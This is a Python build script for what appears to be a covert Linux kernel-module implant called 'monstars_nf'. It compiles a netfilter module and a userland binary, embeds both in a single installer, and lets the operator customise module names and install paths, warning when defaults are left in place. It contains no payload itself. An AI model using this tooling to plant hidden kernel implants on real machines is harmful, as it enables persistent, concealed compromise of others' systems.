"""Come on and SLAM! And welcome to the JAM!"""
import argparse
import glob
import os
import pathlib
import shutil
import subprocess
import sys

# source file and build output paths
SRC_DIR = pathlib.Path(__file__).parent / "src"
INSTALLER_DIR = SRC_DIR / "installer"
KERNEL_DIR = SRC_DIR / "kernel"
USER_DIR = SRC_DIR / "user"

ROOT_DIR = pathlib.Path(__file__).parent.parent
BUILD_DIR = ROOT_DIR / "build" / "blanko"
EXPORT_DIR = ROOT_DIR / "export"

USER_EXE_NAME = "blanko"
INSTALLER_NAME = "blanko-install"

# user-configurable artifact names
DEFAULT_KO_NAME = "blanko"
DEFAULT_EXE_PATH = "/bin/blanko"

# precompiled headers and stampable constants
KO_PRECOMPILED_H = "ko_precompiled.h"
KO_CONST_NAME = "c_KernelMod"
KO_STAMP_MAGIC = b"BASKETBALLJONES"

USER_PRECOMPILED_H = "user_precompiled.h"
USER_CONST_NAME = "c_UserExe"

INSTALLER_STAMP_MAGIC_USER = b"BASKETBALLJONES"
INSTALLER_STAMP_MAGIC_KO = b"MORONMOUNTAIN"

PRECOMPILED_HEADER_TEMPLATE = """
/*
 *  THIS IS A GENERATED HEADER FILE
 */
#ifndef {define}
#define {define}

char {var_name}[{arr_len}] = {{ {init_list} }};

#endif  // {define}
"""


def _stamp_binary(binary, stamp_pattern, stamp_data):
    """Stamp over a pattern in the binary data and return the result"""
    print(f"\n\n** Stamping over {stamp_pattern}")
    idx = binary.index(stamp_pattern)
    return binary.replace(binary[idx : idx + len(stamp_data) + 1], stamp_data + b"\x00")


def _generate_header(binary, dst_path, var_name):
    """Generate a header from a precompiled binary"""
    print(f"\n\n** Generating {dst_path}...")
    bin_str = bytes.hex(binary)
    arr_elems = [f"0x{bin_str[i:i+2]}" for i in range(0, len(bin_str), 2)]

    header_contents = PRECOMPILED_HEADER_TEMPLATE.format(
        define=dst_path.name.replace(".", "_").upper(),
        var_name=var_name,
        arr_len=len(arr_elems),
        init_list=", ".join(arr_elems),
    )
    with open(dst_path, "w") as hdr:
        hdr.write(header_contents)


def run_build(kernel_ver, ko_name, exe_path, debug):
    """Build it!"""
    target = "debug" if debug else ""
    os.environ.update(
        {
            "INSTALLER_NAME": INSTALLER_NAME,
            "KERNEL_VER": kernel_ver,
            "KERNEL_MAJ_VER": kernel_ver[0],
            "MOD": ko_name,
            "USER_EXE_NAME": USER_EXE_NAME,
        }
    )
    # Clean up old build artifacts for this kernel
    if os.path.isdir(BUILD_DIR / kernel_ver):
        shutil.rmtree(BUILD_DIR / kernel_ver)
    os.makedirs(BUILD_DIR / kernel_ver, exist_ok=True)

    # Build kernel module
    print(f"\n\n** Building {ko_name}.ko for {kernel_ver}...\n")
    tempname = (ko_name != DEFAULT_KO_NAME)
    if tempname:
        shutil.copyfile(KERNEL_DIR / f"{DEFAULT_KO_NAME}.c", KERNEL_DIR / f"{ko_name}.c")
    subprocess.run(
        f"make {target}", cwd=KERNEL_DIR, shell=True
    )
    # Cleanup kbuild
    if tempname:
        os.unlink(KERNEL_DIR / f"{ko_name}.c")
    subprocess.run(
        "make clean", cwd=KERNEL_DIR, shell=True
    )
    # Stamp user exe path into kernel module binary
    with open(BUILD_DIR / kernel_ver / f"{ko_name}.ko", "rb") as f:
        kernel_bin = f.read()
    kernel_bin = _stamp_binary(kernel_bin, KO_STAMP_MAGIC, exe_path.encode("ascii"))

    # Build userland executable
    print(f"\n\n** Building user exe for {kernel_ver}...\n")
    subprocess.run(
        f"make {target}", cwd=USER_DIR, shell=True
    )
    with open(BUILD_DIR / kernel_ver / USER_EXE_NAME, "rb") as f:
        user_bin = f.read()
    
    # Generate precompiled headers
    _generate_header(
        kernel_bin,
        BUILD_DIR / kernel_ver / KO_PRECOMPILED_H,
        KO_CONST_NAME,
    )
    _generate_header(
        user_bin,
        BUILD_DIR / kernel_ver / USER_PRECOMPILED_H,
        USER_CONST_NAME,
    )

    # Build installer executable
    print(f"\n\n** Building installer for {kernel_ver}...\n")
    subprocess.run(
        f"make {target}", cwd=INSTALLER_DIR, shell=True
    )
    # Stamp installer with user exe path and ko module path
    ko_path = f"/lib/modules/{kernel_ver}/kernel/drivers/net/{ko_name}.ko".encode("ascii")
    with open(BUILD_DIR / kernel_ver / INSTALLER_NAME, "rb") as f:
        installer_bin = f.read()
    installer_bin = _stamp_binary(installer_bin, INSTALLER_STAMP_MAGIC_KO, ko_path)
    installer_bin = _stamp_binary(installer_bin, INSTALLER_STAMP_MAGIC_USER, exe_path.encode("ascii"))

    # Copy installer to export directory
    installer_dest = EXPORT_DIR / f"{INSTALLER_NAME}_{kernel_ver}"
    os.makedirs(EXPORT_DIR, exist_ok=True)
    with open(installer_dest, "wb") as f:
        f.write(installer_bin)
    print(f"Wrote installer binary to {installer_dest}")


if __name__ == "__main__":
    # autodetect installed kmod build environments
    try:
        kernel_versions = os.listdir("/lib/modules")
        kernel_versions.sort()
    except FileNotFoundError:
        kernel_versions = []
    if len(kernel_versions) == 0:
        print("*** WARNING: NO KBUILD ENVIRONMENTS DETECTED ***")
    # args
    parser = argparse.ArgumentParser(description="Build a monstars_nf installer binary")
    parser.add_argument(
        "-d", "--debug",
        action="store_true",
        help="build components with debug symbols",
    )
    parser.add_argument(
        "-v", "--kernel-ver",
        default=kernel_versions[-1] if len(kernel_versions) else None,
        choices=kernel_versions,
        help="linux kernel version to build against",
    )
    parser.add_argument(
        "-k", "--ko-name",
        default=DEFAULT_KO_NAME,
        help="name to use for the kernel netfilter module",
    )
    parser.add_argument(
        "-e", "--exe-path",
        default=DEFAULT_EXE_PATH,
        help="path to the userland executable",
    )
    args = parser.parse_args()
    if args.ko_name == DEFAULT_KO_NAME and not args.debug:
        print("*** WARNING: USED DEFAULT KO NAME FOR NON-DEBUG BUILD ***")
    if args.exe_path == DEFAULT_EXE_PATH and not args.debug:
        print("*** WARNING: USED DEFAULT EXE PATH FOR NON-DEBUG BUILD ***")
    run_build(args.kernel_ver, args.ko_name, args.exe_path, args.debug)
